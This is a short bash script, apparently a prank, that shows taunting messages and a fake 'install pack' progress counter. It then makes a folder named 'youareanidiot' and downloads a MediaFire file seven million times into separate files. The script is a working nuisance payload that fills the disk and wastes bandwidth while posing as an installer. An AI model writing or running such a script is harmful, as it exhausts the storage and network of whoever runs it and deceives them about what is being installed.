#!/bin/bash
clear
echo -e "\e[1;37m not OPEN file!!!\e[0m"
sleep 1
clear
echo -e "\e[1;37m you not press..[0m"
sleep 1
clear
echo -e "\e[1;37m hello!!\e[0m"
sleep 1
clear
for i in {1..7000000}; do echo -ne "\e[1;37m1. install [${i}] pack\r[0m"; done
mkdir youareanidiot
cd youareanidiot
for i in {1..7000000}; do curl  -s -o idiot_$i 'https://www.mediafire.com/file/8u3ptcr0riczx0k/00n0.txt/file'
      echo -ne "\e[1;31mDownloading: $i / 7000000\e[0m\r" ; done
clear
